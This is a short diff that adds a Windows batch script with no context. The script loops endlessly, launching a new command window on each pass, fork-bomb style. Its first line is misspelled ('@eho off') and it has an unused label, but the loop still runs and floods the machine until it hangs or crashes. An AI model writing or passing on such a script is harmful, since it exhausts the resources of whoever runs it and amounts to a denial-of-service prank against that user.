@@ -1,0 +1,5 @@
+@eho off
+:a
+start cmd
+:Repath
+Goto :a 
